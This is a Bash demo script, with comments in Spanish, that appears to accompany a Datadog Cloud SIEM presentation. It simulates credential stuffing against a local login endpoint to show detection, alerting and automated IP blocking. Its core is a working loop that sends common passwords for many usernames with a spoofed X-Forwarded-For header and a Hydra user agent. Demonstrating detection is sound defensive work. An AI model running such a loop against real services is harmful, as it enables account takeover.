#!/usr/bin/env bash
#
# demo2-siem.sh — Escenario 2: Cloud SIEM + alertas + Workflow Automation.
# Historia: "Miguel se va de vacaciones y nadie monitorea."
#
# Simula credential stuffing desde UNA IP atacante contra muchos usuarios, para
# que la detection rule de ATO (credential stuffing / brute force) dispare en
# Cloud SIEM, notifique y lance el workflow de bloqueo.
#
# Uso:  ./attack/demo2-siem.sh http://localhost:8080
#
set -uo pipefail

TARGET="${1:-http://localhost:8080}"
ATTACKER_IP="${2:-45.137.21.9}"           # IP "atacante" (spoof via X-Forwarded-For)
SCANNER_UA="Hydra/9.5"

B=$'\033[1m'; C=$'\033[36m'; G=$'\033[32m'; Y=$'\033[33m'; R=$'\033[31m'; N=$'\033[0m'

pausa() {
  echo; echo "${Y}   >> ${1}${N}"
  echo "${Y}   ---------------------------------------------------------------${N}"
  printf "${Y}   [ENTER] continuar · [q] salir: ${N}"; read -r _k
  [ "$_k" = "q" ] && { echo "Fin."; exit 0; }; echo
}
decir() { echo "   ${C}Qué decir:${N} \"${1}\""; }

attempt() {  # usuario password
  curl -s -o /dev/null -A "$SCANNER_UA" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $ATTACKER_IP" \
    -d "{\"username\":\"$1\",\"password\":\"$2\"}" "$TARGET/login"
}

clear
cat <<EOF
${B}========================================================================${N}
${B}  DEMO AAP — ProsperIA · Escenario 2: Cloud SIEM + Workflow${N}
${B}  "Miguel se fue de vacaciones. ¿Quién vigila?"${N}
${B}  Objetivo: ${TARGET}   ·   IP atacante simulada: ${ATTACKER_IP}${N}
${B}========================================================================${N}

  Ten abierto en Datadog:
    - Logs:       Logs -> Search  (service:prosperia-patient-api @evt.category:authentication)
    - Cloud SIEM: Security -> SIEM -> Signals
EOF
pausa "Listo para empezar"

# ----------------------------------------------------------------------------
echo "${B}[1/4] Tráfico normal de login — línea base${N}"
attempt jennifer demo1234
echo "      1 login válido de jennifer (198.x)   ${G}OK${N}"
decir "Así se ve un acceso legítimo. Nadie está mirando los logs a mano ahora."
pausa "En Datadog: Logs -> ves el evento authentication/success"

# ----------------------------------------------------------------------------
echo "${B}[2/4] Credential stuffing — una IP, muchos usuarios y passwords${N}"
USERS=(jennifer miguel elias admin root soporte ti enfermeria recepcion doctor)
PASSWORDS=(123456 password admin qwerty letmein 111111 abc123 prosperia2025 changeme welcome)
total=0
for u in "${USERS[@]}"; do
  for p in "${PASSWORDS[@]}"; do
    attempt "$u" "$p"; total=$((total+1))
  done
  printf "      probando usuario %-12s ${R}fallos acumulados: %s${N}\n" "$u" "$total"
  sleep 0.2
done
echo
echo "      ${R}Total: $total intentos fallidos desde $ATTACKER_IP${N}"
decir "Esto es lo que pasa un martes a las 3am sin Miguel. Datadog sí está mirando."
pausa "En Datadog: Security -> SIEM -> Signals -> aparece 'Credential Stuffing' / brute force (agrupada por IP)"

# ----------------------------------------------------------------------------
echo "${B}[3/4] Respuesta automática — Workflow Automation${N}"
echo "   ${C}En la señal de Cloud SIEM:${N}"
echo "     - Notificación a Slack/correo (sin Miguel en la jugada)"
echo "     - Workflow que bloquea la IP (AAP Block IP via API) o deshabilita al usuario"
decir "El proceso que Miguel hace a mano, ahora corre solo: detecta, avisa y bloquea."
pausa "En Datadog: muestra el Workflow (o el botón de respuesta en la señal)"

# ----------------------------------------------------------------------------
echo "${B}[4/4] Dashboard de seguridad — la foto para Jennifer${N}"
echo "   IPs atacantes · # de ataques · frecuencia · top usuarios objetivo"
decir "Esta es la vista que antes no existía: en una pantalla, quién ataca y cuánto."
echo
echo "${G}Fin del escenario 2.${N}"
echo "Pregunta de validación: \"Miguel, ¿cuánto de tu revisión diaria cubre esto?\""
